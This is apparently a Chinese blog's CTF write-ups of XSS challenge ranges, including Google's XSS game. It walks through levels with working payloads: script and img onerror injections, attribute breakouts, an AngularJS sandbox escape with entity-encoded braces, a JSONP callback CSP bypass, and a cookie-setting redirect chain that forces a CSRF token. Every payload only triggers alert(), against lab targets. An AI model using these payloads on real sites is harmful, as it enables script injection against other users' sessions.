<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a&#x3D;&#39;constructor&#39;;b&#x3D;&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309205853997.png" alt="image-20210309205853997"></p>
<p>发现左边的大括号<code>&#123;</code>被过滤了,这里使用到了 HTML实体编码（HTML Entity）</p>
<p>一个HTML Entity都含有2种转义格式：Entity Name 和 Entity Number</p>
<p>比如<code> &#123;</code> 的Entity Name是 <code>&amp;lcub;</code> Entity Number是<code>&amp;#123;</code></p>
<p>把{ 替换为 <code>&amp;lcub;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;lcub;&amp;lcub;a&#x3D;&#39;constructor&#39;;b&#x3D;&amp;lcub;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309210542726.png" alt="image-20210309210542726"></p>
<p>CSP 的实质就是白名单制度，它明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p>这里设置了，只能访问两个网址：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310094306764.png" alt="image-20210310094306764"></p>
<p>再看网络请求有一个jsonp?menu=about请求，返回的是callback</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310094348990.png" alt="image-20210310094348990"></p>
<blockquote>
<p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <code>&lt;script&gt;</code>元素标签，远程调用 JSON 文件来实现数据传递。</p>
</blockquote>
<p>源码结尾引入了/static/js/level7.js，我们来看看js代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Ask server side what to display.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。</span></span><br><span class="line"><span class="comment">//atob 对应的是 Base64 编码方式的解码操作，对应的，btoa就是编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> m = location.search.match(<span class="string">&#x27;menu=(.*)&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> menu = m ? atob(m[<span class="number">1</span>]) : <span class="string">&#x27;about&#x27;</span>;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Display stuff returned from server side.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">data</span></span> - JSON data from server side</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 通过代码判断，data 应该是 json 格式。</span></span><br><span class="line"><span class="comment">// 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (data.title) <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;h1&gt;&#x27;</span> + data.title + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (data.pictures) data.pictures.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;img src=&quot;/static/img/&#x27;</span> + url + <span class="string">&#x27;&quot;&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
<p>我们关注一下下面这行代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>); </span><br></pre></td></tr></table></figure>
<p>因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。</p>
<blockquote>
<p>在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞：<br><code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
</blockquote>
<p>我们来试着请求一下，发现123回显到了最前面</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310100606514.png" alt="image-20210310100606514"></p>
<p>所以我们可以构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;wmOM2q5NJnZS&#x2F;jsonp?callback&#x3D;alert(1)%3B%2F%2F</span><br><span class="line">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310101624891.png" alt="image-20210310101624891"></p>
<ul>
<li>过程</li>
</ul>
<p>给 menu 传入经过 base64 编码后的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&#39;jsonp?callback&#x3D;alert();&#x2F;&#x2F;&#39;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>再前端会执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;jsonp?callback=alert();//&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>把这个<code>&lt;script&gt;</code>标签显示在前端，然后前端访问这个标签里面的src，返回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">callback(&#123;&quot;title&quot;:&quot;Error, no such menu: &lt;script src&#x3D;&#39;jsonp?callback&#x3D;alert();&#x2F;&#x2F;&#39;&gt;&lt;&#x2F;script&gt;&quot;&#125;)</span><br></pre></td></tr></table></figure>
<p>返回的内容会执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (data.title) document.write(&#39;&lt;h1&gt;&#39; + data.title + &#39;&lt;&#x2F;h1&gt;&#39;);</span><br></pre></td></tr></table></figure>
<p>将返回的内容中的title部分显示出来，里面的 <code>&lt;script&gt;</code> 标签触发一个请求，script 而请求的返回内容为：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert();&#x2F;&#x2F;&#39;&gt;&lt;&#x2F;script&gt;(&#123;&quot;title&quot;:&quot;Welcome to my Website!&quot;,&quot;pictures&quot;:[&quot;const.png&quot;]&#125;)</span><br></pre></td></tr></table></figure>
<p>alert(); 后面被注释掉，执行 alert();</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;wmOM2q5NJnZS&#x2F;?menu&#x3D;PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCk7Ly8nPjwvc2NyaXB0Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>


<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310104440678.png" alt="image-20210310104440678"></p>
<ul>
<li>查看代码</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read cookie.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">name</span></span> - Name of the cookie</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>Cookie value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> match = <span class="built_in">RegExp</span>(<span class="string">&#x27;(?:^|;)\\s*&#x27;</span> + name + <span class="string">&#x27;=([^;]*)&#x27;</span>).exec(<span class="built_in">document</span>.cookie);</span><br><span class="line">    <span class="keyword">return</span> match &amp;&amp; match[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> username = readCookie(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (username) &#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;h1&gt;Welcome &#x27;</span> + username + <span class="string">&#x27;!&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    csrf_token.value = readCookie(<span class="string">&#x27;csrf_token&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>HTML页面的生命周期有以下三个重要事件：</p>
<ul>
<li><code>DOMContentLoaded</code> —— 浏览器已经完全加载了 HTML，DOM 树已经构建完毕，但是像是 <code>&lt;img&gt;</code> 和样式表等外部资源可能并没有下载完毕。</li>
<li><code>load</code> —— 浏览器已经加载了所有的资源（图像，样式表等）。</li>
<li><code>beforeunload/unload</code> —— 当用户离开页面的时候触发。</li>
</ul>
<p>每个事件都有特定的用途</p>
<ul>
<li><code>DOMContentLoaded</code> —— DOM 加载完毕，所以 JS 可以访问所有 DOM 节点，初始化界面。</li>
<li><code>load</code> —— 附加资源已经加载完毕，可以在此事件触发时获得图像的大小（如果没有被在 HTML/CSS 中指定）</li>
<li><code>beforeunload/unload</code> —— 用户正在离开页面：可以询问用户是否保存了更改以及是否确定要离开页面。</li>
</ul>
</blockquote>
<p>尝试设置名字为123，点击Set ，有三个参数，name，value，和 redirect（跳转页面）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;d9u16LTxchEi&#x2F;set?name&#x3D;name&amp;value&#x3D;123&amp;redirect&#x3D;index</span><br></pre></td></tr></table></figure>
<p>然后，查看cookie，显示 name=123，看来这是设置cookie的值，同时我们发现cookie有个csrf_token，同理我们应该可以这样设置csrf_token的内容</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310110714849.png" alt="image-20210310110714849"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set?name&#x3D;csrf_token&amp;value&#x3D;token&amp;redirect&#x3D;index</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114011334.png" alt="image-20210310114011334"></p>
<p>Wire transfer:</p>
<p>正常情况下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;d9u16LTxchEi&#x2F;transfer?name&#x3D;13&amp;amount&#x3D;123&amp;csrf_token&#x3D;token</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114211813.png" alt="image-20210310114211813"></p>
<p>当我们输入<code>amount</code>不是数字，会显示出amount的内容，我们的输出点就在amount了</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114301503.png" alt="image-20210310114301503"></p>
<p>如果amount的值是payload，会成功弹窗，但是他会提示其他用户打开时候的token和我们的并不一样，因此需要更进一步。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114736419.png" alt="image-20210310114736419"></p>
<p>这时候我们回头整理一下，set 可以设置csrf_token，并且有个跳转参数，Wire transfer 可以执行xss攻击；那么我们就可以先在set 设置csrf_token，然后跳转到transfer执行xss攻击，这样不管是谁访问都会受到攻击。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set?name&#x3D;csrf_token&amp;value&#x3D;token&amp;redirect&#x3D;transfer?name&#x3D;god&amp;amount&#x3D;&lt;script&gt;alert()&lt;&#x2F;script&gt;&amp;csrf_token&#x3D;token</span><br></pre></td></tr></table></figure>
<p>但我们要注意&amp;符号，如果直接访问，redirect的值只有一部分：transfer?name=god</p>
<p>因此我们要URL编码一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set?name&#x3D;csrf_token&amp;value&#x3D;token&amp;redirect&#x3D;transfer%3Fname%3Dgod%26amount%3D%3Cscript%3Ealert()%3C%2Fscript%3E%26csrf_token%3Dtoken</span><br></pre></td></tr></table></figure>


<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.freebuf.com/articles/web/133384.html" >Google最新XSS Game Writeup<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.jianshu.com/p/f70744029d5e" >Google xss挑战赛(2017) writeup<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.lhaihai.top/post/xssgame/" >XSS Game<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Google XSS game</title>
    <url>/2021/03/10/Google%20XSS%20game/</url>
    <content><![CDATA[<h2 id="Google-XSS-game"><a href="#Google-XSS-game" class="headerlink" title="Google XSS game"></a>Google XSS game</h2><p>这是谷歌的XSS靶场，每一关的过关条件是能够弹出<code>alert()</code>即可。</p>
<p>地址：<a class="link"   href="https://xss-game.appspot.com/" >https://xss-game.appspot.com/<i class="fas fa-external-link-alt"></i></a>  (需要科学上网)</p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224534084.png" alt="image-20210308224534084"></p>
<p>这是一个反射型XSS，直接输入最基本的XSS代码即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224729370.png" alt="image-20210308224729370"></p>
<p>留言板应用，显然是一个存储型XSS，尝试<code>&lt;script&gt;</code>标签无果，尝试使用<code>&lt;img&gt;</code>标签：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309093515031.png" alt="image-20210309093515031"></p>
<p>这是一个页面嵌套，没有可见的可以利用的点，只能从源码入手</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">        $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">          chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数解释</li>
</ul>
<p>parseInt()：parseInt() 函数可解析一个字符串，并返回一个整数。</p>
<p>unescape()：对通过 escape() 编码的字符串进行解码。</p>
<p>querySelectorAll()：返回文档中匹配指定 CSS 选择器的所有元素，返回 <a class="link"   href="https://www.runoob.com/js/js-htmldom-nodelist.html" >NodeList<i class="fas fa-external-link-alt"></i></a> 对象。NodeList 对象表示节点的集合。可以通过索引访问，索引值从 0 开始。</p>
<p>location.hash ：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。也就是说，他的作用是把URL的<code>#</code>以及<code>#</code>后面的数据取出来，</p>
<p>window.onload()：方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
<p><em>element</em>.addEventListener(<em>event, function, useCapture</em>)：方法用于向指定元素添加事件句柄。第一个参数是事件的类型 (如 “click” 或 “mousedown”)。第二个参数是事件触发后调用的函数。第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
<p>html()：方法设置或返回被选元素的内容（innerHTML）。当该方法用于返回内容时，则返回第一个匹配元素的内容。当该方法用于设置内容时，则重写所有匹配元素的内容。</p>
<ul>
<li>利用方法</li>
</ul>
<p>我们知道页面会调用chooseTab函数，将url中#后面的字符串做为参数传入。我们需要构造一个字符串，使img标签加载的时候执行我们的代码。这里我们可以把 src 截断，这样他的图片肯定会报错，然后添加一个 onerror 事件执行alert()，最后还要把 img 标签后面的 <code>&gt;</code>补齐</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>


<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210309102640296.png" alt="image-20210309102640296"></p>
<ul>
<li>查看源码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.history.back();</span></span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level4.png&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/loading.gif&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当我们在 index.html 页面输入时间后，就会把<code>timer</code>参数传递到 timer.html 页面中，在onload时间时就会触发<strong>startTimer</strong>函数，我们可以从这个onload事件进行利用，把前一句话闭合，加上自己构造的语句，最后还要把后面的给注释掉，这就是dom xss的利用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;);alert();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309104838145.png" alt="image-20210309104838145"></p>
<p>这里有3个页面，分别是welcome，注册和确定</p>
<ul>
<li><p>查看源码</p>
<ul>
<li>welcome.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">    Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/level5/frame/signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">    for an exclusive Beta.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以看到，下面的a标签的链接带了一个<code>next</code>参数到signup页面</p>
<ul>
<li>signup.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reader-email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在signup页面把welcome页面传过来的<code>next</code>参数直接解析放到了下面的a标签的链接中</p>
</li>
<li><p>利用方法</p>
</li>
</ul>
